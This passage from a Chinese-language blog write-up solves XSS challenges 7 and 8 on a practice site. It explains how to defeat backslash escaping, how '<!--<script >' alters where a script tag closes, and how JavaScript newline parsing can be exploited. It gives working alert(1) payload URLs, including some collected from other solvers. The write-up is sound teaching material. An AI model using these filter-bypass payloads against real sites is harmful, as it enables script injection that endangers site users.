class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~7</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>123<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="string">'px'</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>知识点</strong>：</p><ul><li>当在字符串过滤中使用<code>\</code>的绕过方式</li><li><code>&lt;!-- &lt;script&gt;</code>可以突破<code>&lt;/script&gt;</code>标签的限制</li><li>浏览器对于<code>&lt;script/&gt;</code>不解析为标签，但是<code>&lt;script /&gt;</code>一类的可以正常解析</li><li>浏览器对于JS无分号换行的处理方式</li></ul><p>题目的尿性，提示px，肯定是输入px参数，也就直接加上啦，就会发现有两个回显点：script标签中一个，div标签中一个。</p><p>老样子使用一个字符集去看看两个地方是怎么处理的：<code>123&quot;&#39;/\&lt;&gt;()&#39;%3b+%2b-*/%26|~^%25!%3f%3d%60%3b</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">var px=&apos;123px_xss\&apos;\/\\&lt;\&gt;()\&apos;\;  -*\/&amp;|~^%!?=`\;&apos;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">give me xss by pass~7</span><br><span class="line">&lt;div style=&quot;display:none&quot;&gt;123&amp;quot;&apos;/\&amp;lt;&amp;gt;()&apos;; +-*/&amp;amp;|~^%!?=`;&lt;/div&gt;</span><br><span class="line">&lt;!--px--&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">&apos;px&apos;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ul><li>第一处插入点，在script标签中：对于<code>&#39; / &lt; &gt; ;</code>做了<code>\</code>转义，使用转义可以防止<code>&#39;</code>作为符号解析闭合字符串</li><li>第二处插入点，在div标签中：对于<code>&#39; &lt; &gt; &amp;</code>做了html转义，防止插入标签。</li></ul><p>看似挺好的防护，第二处<code>&lt; &gt;</code>被转义插入不了标签是完全没有机会的，直接掠过，看第一处插入点</p><h3 id="字符串中的-转义绕过"><a href="#字符串中的-转义绕过" class="headerlink" title="字符串中的\转义绕过"></a>字符串中的<code>\</code>转义绕过</h3><p>如果我们简单的插入一个单引号确实是会被转义从而闭合无效：<code>var px=&#39;123\&#39;&#39;</code></p><p>但是我们知道字符串中的<code>\</code>一个使用的使用是对后面的字符做转义处理，即作为字符串的一部分解析，同样我们想要在字符串中使用<code>\</code>符号的时候需要<code>\\</code>这样书写即为一个<code>\</code></p><p>回顾转义列表，并没有对我们输入的<code>\</code>添加<code>\</code>进行转义，于是我们就可以输入一个<code>\</code>来反过来转义掉服务端添加的用于转义<code>&#39;</code>的<code>\</code> </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://px1624.sinaapp.com/test/xsstest7/?px=123\'</span></span><br><span class="line"><span class="comment">//第一个\用于转义服务端添加的\</span></span><br><span class="line"><span class="comment">//'作为结构进行闭合</span></span><br><span class="line"><span class="keyword">var</span> px=<span class="string">'123\\'</span><span class="string">'</span></span><br></pre></td></tr></table></figure><p>于是完成闭合，接下来可以尝试拼接js，引入可以执行的js代码。</p><h3 id="5种方法尝试闭合"><a href="#5种方法尝试闭合" class="headerlink" title="5种方法尝试闭合"></a>5种方法尝试闭合</h3><p>给出后面单引号的五条闭合思路：</p><ol><li>正儿八经闭合，构造正确的JS语法，<strong>可以尝试</strong></li><li><code>//</code>：JS单行注释，注释掉后面需要闭合的东西，<strong>可以尝试</strong>。</li><li><code>/* */</code>：JS跨行注释，<strong>在当前环境上不能使用</strong>。突破不了script标签，只能在script标签内部进行多行注释</li><li><code>&lt;!--</code>：HTML跨行注释，<strong>机制上不能使用</strong>。HTML跨行注释，在script标签中，起不到注释作用</li><li>模板字符串注释—反引号：跨行注释，没试过，<strong>可以尝试</strong>。</li></ol><p>再结合给出两条payload插入思路进行判断：</p><ol><li>JS中<code>;</code>闭合前面的语句然后写入新的JS语句</li><li>使用运算符拼接字符串的形式，即使用<code>-</code>、<code>in</code>之类的符号</li></ol><p>第一个payload插入思路使用；明显不行因为<code>;</code>被/转义了形成<code>/;</code>会语法报错；只能使用第二个思路使用运算符。</p><ul><li>尝试<strong>第一个闭合思路</strong>：<strong>正儿八经闭合</strong>，后面是<code>&#39;;</code></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// http://px1624.sinaapp.com/test/xsstest7/?px=123\'-alert(1)-'</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'123\\'</span>-alert(<span class="number">1</span>)-\<span class="string">''</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后面单引号因为引入了一个<code>\</code>，这样的语法会报错，GG。</p><ul><li>尝试<strong>第二个思路</strong>：<code>//</code>JS单行注释：</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// http://px1624.sinaapp.com/test/xsstest7/?px=123\'-alert(1)//</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'123\\'</span>-alert(<span class="number">1</span>)\/\/<span class="string">';</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同样因为<code>/</code>会被<code>\</code>转义导致无法引入单行注释符号，GG</p><ul><li>证明<strong>第三个思路</strong>不可用：<code>/* */</code>：JS跨行注释</li></ul><p>建立该测试页面，访问</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'123'</span>;<span class="comment">/*</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~7</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui8diry8j30qn06kt8y.jpg" alt="7-3-false.png"></p><p>文字不会被注释，代表<code>/* */</code>JS跨行注释无法突破script标签进行跨行注释。</p><ul><li>证明<strong>第四个思路</strong>不可用：<code>&lt;!--</code>：HTML跨行注释</li></ul><p>建立测试页面，访问</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">&lt;!--</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'123'</span>;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~7</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>文字不会被注释，代表<code>&lt;!-- --&gt;</code>HTML跨行注释无法突破script标签进行跨行注释。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui8ir3a5j30sv07j3yr.jpg" alt="7-4-false.png"></p><ul><li>尝试<strong>第五个思路</strong>：<strong>模板字符串</strong>进行跨行注释</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// http://px1624.sinaapp.com/test/xsstest7/?px=\'-alert(1)-`;//</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'\\'</span>-alert(<span class="number">1</span>)-<span class="string">`\;\/\/';</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~7</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>\'-alert(1)-`;//<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="string">'px'</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>看vscode中的高亮应该清楚点，这里显示是可以成功跨script标签进行注释的。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui8o8xgwj30pb0b1t9c.jpg" alt="7-vscode高亮.png"></p><p>尝试在命令行中执行这段JS，逻辑是没有问题的：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui8sb55kj313n0oiabg.jpg" alt="7-弹框.png"></p><p>但是直接访问，让谷歌浏览器解析，仍然无法跨越script标签，同时其他浏览器也不行。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui8y3emyj30rh0gbjsb.jpg" alt="7-5-谷歌解析.png"></p><p>看来模板字符串也被封死了，陷入僵局。</p><h3 id="lt-–-标签突破script标签"><a href="#lt-–-标签突破script标签" class="headerlink" title="&lt;!– 标签突破script标签"></a>&lt;!– 标签突破script标签</h3><p>参考<a href="https://www.dazhuanlan.com/2019/10/25/5db1e6beea817/" target="_blank" rel="noopener">此篇文章</a>得知<code>&lt;!--</code>标签会改变script标签配对规则，即：在<code>&lt;!--</code>之后的<code>&lt;script&gt;</code>会优先匹配一个<code>&lt;/script&gt;</code></p><p>我们可以引入一个script去闭合掉原生的<code>&lt;/script&gt;</code>，这样就可以突破script把后面也作为JS解析。</p><p>但是这个特性在测试中，并不是那么万能，具有局限性。</p><p>按照字面解释的预期，这样的页面是可以正常执行JS的</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">  </span></span><br><span class="line"><span class="undefined">    alert(1);</span></span><br><span class="line"><span class="undefined">    &lt;!-- </span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"> </span></span></span><br><span class="line"><span class="undefined">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    --&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是实际并不可以，会报错。</p><p>我们先通过以下例子来证明在<code>&lt;!--</code>之后的<code>&lt;script&gt;</code>的确会抢先匹配，影响标签解析：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">  </span></span><br><span class="line"><span class="undefined">    alert(1);</span></span><br><span class="line"><span class="javascript">    &lt;!-- <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="comment">//删这行</span></span></span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(<span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>/)&#123;</span><br><span class="line">        alert(1)</span><br><span class="line">    &#125;</span><br><span class="line">    --&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>单行的<code>&lt;!--</code>在JS中具有单行注释的作用，所以理论上第三行加了和没加应该是一样的，但是实际结果却不是</p><ul><li>不删第三行：会弹框1（说明JS正常执行）</li><li>删第三行：之后的alert(1)会被当作html解析，即script标签结束了（说明script标签被<code>1&lt;/script&gt;/</code>这边的script标签提前闭合了）</li></ul><p>情况出现了变化，证明我们的<code>&lt;!-- &lt;script&gt;</code>虽然是注释了，但是却改变了执行情况，即优先闭合下一个script后标签。说明我们注释的<code>&lt;script&gt;</code>把<code>1&lt;/script&gt;/</code>这边的标签给闭合了从而完成了外部标签的正常闭合。</p><p>再看例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span>(<span class="built_in">console</span>.log(<span class="string">"&lt;!--var a;&lt;script&gt;"</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>/)</span><br><span class="line">        alert("script data state");</span><br><span class="line">    else</span><br><span class="line">        alert("script data state too");</span><br><span class="line">        --&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此处我们的<code>&lt;!--</code>出现在了字符串中，执行结果是console.log打印并且弹框script data state</p><p>先得出最终使用结论，再来对上述例子进行解释：</p><ol><li><p>JS在引入的<code>&lt;!--</code>跟<code>script标签</code>后形成的代码要满足JS语法正确。</p><p>（在script标签对中，突然出现一个script标签，这是不符合JS语法的。这就解释了我们之前第一个预期成功然而失败的案例，是因为JS语法错误而失败）</p></li><li><p>满足JS语法后的解析，会开始跳出JS语法逻辑寻找<code>&lt;!--</code>。只是单纯的字符串匹配，所以即使是字符串内的<code>&lt;!--</code>或者注释的<code>&lt;!--</code>都满足。</p></li><li><p>会开始寻找 script标签，同样寻找的过程同样跟JS语法无关，会单纯的寻找标签字符</p></li></ol><p>对之前的例子进行解释：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先上述两个成功执行的实例都JS语法正确</span></span><br><span class="line">&lt;!-- <span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> <span class="comment">//JS中&lt;!-- 作为注释符 后面被注释了 JS语法正确</span></span></span></span><br><span class="line">"&lt;!--var a;&lt;script&gt;" //&lt;!--和&lt;script&gt;作为字符串 JS语法正确</span><br><span class="line">//关于&lt;/script&gt;/</span><br><span class="line">console.log("&lt;!--var a;&lt;script&gt;")&lt;/script&gt;/  </span><br><span class="line"><span class="xml">1<span class="tag">&lt;/<span class="name">script</span>&gt;</span>/</span></span><br><span class="line"><span class="xml">//虽然出现了<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span>,但是后面多了一个/</span><br><span class="line"><span class="comment">//这里其实是为了满足JS语法补充一个/</span></span><br><span class="line"><span class="comment">//作为JS解析的话其实是一个比较运算符 两边进行小于&lt;比较</span></span><br><span class="line"><span class="comment">//右侧是一个正则表达式的//</span></span><br></pre></td></tr></table></figure><p>至此我们就得出了<strong>&lt;!–标签在JS语法正确的情况下可以引入scirpt前标签去优先闭合script后标签从而完成script标签突破</strong>，来结合题目解题。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// http://px1624.sinaapp.com/test/xsstest7/?px=123\%27-alert(1)//</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'123\\'</span>-alert(<span class="number">1</span>)\/\/<span class="string">';</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~7</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>123\'-alert(1)//<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--px--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="string">'px'</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>参考题目环境，我们明确需要处理：</p><ul><li>加入<code>&lt;!--&lt;script&gt;</code>去闭合第一个<code>&lt;/script&gt;</code>：需要防止JS语法错误（可以加入到字符串中）</li><li>突破script标签后，这部分give me xss什么的会作为JS的一部分解析，我们需要引入一个<strong>跨行字符串或注释</strong>一类的包括住他们，确保其语法正确。（可以选用模板字符串或者<code>/* */</code>JS多行注释(之后测试由于环境，单独使用JS多行注释无法完成)）</li><li>由于第一个script标签会跟最后一个script后标签闭合，<code>&lt;/div&gt;&lt;!--px</code>之后都会被认为是JS语句，还需要处理这边的JS语法错误问题。</li></ul><p>选择加入到前方字符串中，选择模板字符串，先暂时使用//注释掉明显不对劲的<code>&lt;/div&gt;</code>，给出一个初步的payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest7/?px=123%3C!--%3Cscript%3E\%27-alert(1)-`//</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui9ap3tzj30u20d5wfe.jpg" alt="7-0-script标签绕过.png"></p><p>会发现闭合失败了，<code>&lt;/script&gt;</code>还是没有被我们吃掉，因为<code>&lt;script&gt;</code>被转义成<code>&lt;script/&gt;</code></p><p>实验，利用浏览器的特性，加个空格%20：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script\</span>&gt;</span>(解析失败)</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> \&gt;</span><span class="undefined">(解析成功)</span></span><br><span class="line"><span class="undefined">    alert(1)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>成功弹框Writeup:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest7/?px=123%3C!--%3Cscript%20%3E\%27-alert(1)-`//</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui9l68dnj30w00950th.jpg" alt="7-0-成功.png"></p><p>但是回想到刚才其实我们没有明确解决，我们只是想先简单暂时解决下<code>&lt;/div&gt;</code>但是后面的<code>&lt;script&gt;&#39;px&#39;</code>都没有处理为啥就可以成功了？这关乎到JS的换行</p><p>JS其实也是一个比较随便的语言，他的换行会根据当前运算环境分析是要结束当前语句或者是延续下一行拼接，看一个例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> px=<span class="number">1</span> - <span class="number">0</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 4&gt;1</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">4</span>&gt;</span>1</span></span><br><span class="line"><span class="javascript">    &lt;<span class="string">'px'</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(px)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>如果我们使用注释这一行，那么px的值为1，说明赋值语句已经结束了，之后的运算会作为一个新的运算语句解析；</li><li>如果我们不使用注释的这行，结果就会为false，浏览器会把之后的运算认为和赋值语句是一个语句，从而进行比较运算。</li></ul><p>我们把答案的环境简化再合成一行：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'1'</span> - alert(<span class="number">2</span>) - <span class="string">`3`</span> &lt; <span class="number">4</span> &gt; <span class="string">'px'</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//var px='1' - alert(2) - `3` &lt; a &gt; 'px'</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(px)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>该例子语法正确，只是在语句执行的时候从左向右执行，发现找不到a（也就是script）这个变量时报错，但是这不是JS语法错误而是运行的时候报错，所以会正常执行前面的弹框语句。</p><p>再给出其他人的一些payload：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//px1642</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest7/?px=111\%27-alert(1)-`//%3C!--%3Cscript%20</span><br><span class="line">//Huuuuu</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest7/?px=`//*%3C!--%3Cscript%20%3E\%27-alert(1)-`</span><br><span class="line">//香草</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest7/?px=\%27-`-eval(location.hash.slice(1))//%3C!--%20%3Cscript%20%3E`-`#alert(1)</span><br><span class="line">//zeddy</span><br><span class="line">http://px1624.sinaapp.com/test/xsstest7/?px=%3C!--%3Cscript%20`/*\%27-alert(1)-`*///</span><br></pre></td></tr></table></figure><h2 id="第八题"><a href="#第八题" class="headerlink" title="第八题"></a>第八题</h2><p>题目：<a href="http://px1624.sinaapp.com/test/xsstest8/?px=123" target="_blank" rel="noopener">http://px1624.sinaapp.com/test/xsstest8/?px=123</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// http://px1624.sinaapp.com/test/xsstest8/?px=123&lt;&gt;%2b-*/%26|~^%25!%3f%3d`'"</span></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> px=<span class="string">'123\&lt;\&gt; -*\/&amp;|~^%!?=`\'px_xss'</span>;</span><br><span class="line"><span class="keyword">var</span> px1624=<span class="string">'123\&lt;\&gt; -*\/&amp;|~^%!?=`\'px_xss'</span>;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">give me xss by pass~8</span></span><br><span class="line"><span class="regexp">&lt;div style="display:none"&gt;123\&amp;lt;\&amp;gt; -&lt;/</span>div&gt;</span><br><span class="line">&lt;input type=<span class="string">"hidden"</span> value=<span class="string">"123&lt;&gt;+-*/&amp;|~^%!?=`'px_xss"</span>&gt;</span><br></pre></td></tr></table></figure><p>知识点：</p><ul><li>延续之前知识点</li><li><code>&lt;!-- &lt;script&gt;</code>可以多次突破<code>&lt;/script&gt;</code>标签的限制</li><li><code>&lt;script&gt;</code>标签之间互相不管死活</li></ul><p>基础检测payload一丢，四处输出点，确认可以构造payload的输出点：</p><ul><li>第四处对双引号做了黑名单，没戏</li><li>第三处对长度做了限制，同时对&lt;&gt;做了转义，没戏</li><li>同时注意这几处输出的输出处理规则都不太一样</li></ul><p>还是看第一处第二处，突破单引号：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// http://px1624.sinaapp.com/test/xsstest8/?px=123\%27</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px=<span class="string">'123\\'</span><span class="string">';</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> px1624=<span class="string">'123\\'</span><span class="string">';</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">give me xss by pass~8</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span>123\\'<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">value</span>=<span class="string">"123\'"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>老样子可以出来，第一个想法是老规矩在第一个script标签内部尝试构造一个JS语法正确的语句，但是我们会发现，我们永远没法处理最后面的<code>&#39;;</code>，比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=123\&apos;-alert(1)-`</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui9rt7v2j30gj01z0ss.jpg" alt="8-1.png"></p><ol><li>尝试注释符处理后面的尾巴：<ul><li><code>&lt;!--</code>：过滤器变为<code>\&lt;!--</code>，多了一个\无法处理</li><li><code>//</code>：过滤器变为<code>\/\/</code>，失去注释作用</li><li><code>/*</code>：过滤器变为<code>\/*</code>，多了一个\无法处理，同时即使没有\，单单/*的语法也不行</li></ul></li><li>尝试单引号闭合：<ul><li><code>&#39;</code>：过滤器变为<code>/&#39;</code>。多了一个\无法处理</li></ul></li></ol><p>已有知识无解，换条路，尝试用<code>&lt;!--&lt;script&gt;</code>突破script后标签把下面两个输入点也拉入战局，寻求机会。</p><p>思来想去，怼到极致还是死在/上，同时满足不了语法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=123\%27-alert(1)-`*/*%3C!--%3Cscript%20%3E</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1gkui9yto6aj30u0080jsj.jpg" alt="8-2.png"></p><p>放弃。（实际这个思路是有解的，但是不是上述思路）</p><h3 id="多次突破script标签"><a href="#多次突破script标签" class="headerlink" title="多次突破script标签"></a>多次突破script标签</h3><p>换个思路，我们既然可以逃出一个script标签，那是不是可以把标签全部逃光，然后自己写标签？</p><ul><li>那要求我们最后一个输出点不过滤，即：可以自己构造一个被解析的script标签，但是这里最后一个输出点就恰好只过滤双引号不过滤其他的。</li></ul><p>Writeup：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://px1624.sinaapp.com/test/xsstest8/?px=%3C!--%3Cscript%20%3E%3C/script%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">&lt;!--&lt;script &gt;&lt;/script&gt;&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>这里可以看到实际上我们只考虑了标签闭合引入了两个script后标签，其他啥都没考虑，原来script标签内的语法一团糟，疯狂报错，但是因为script标签之间互不影响，这不影响我们写入的script的标签正常解析！</p><p><img 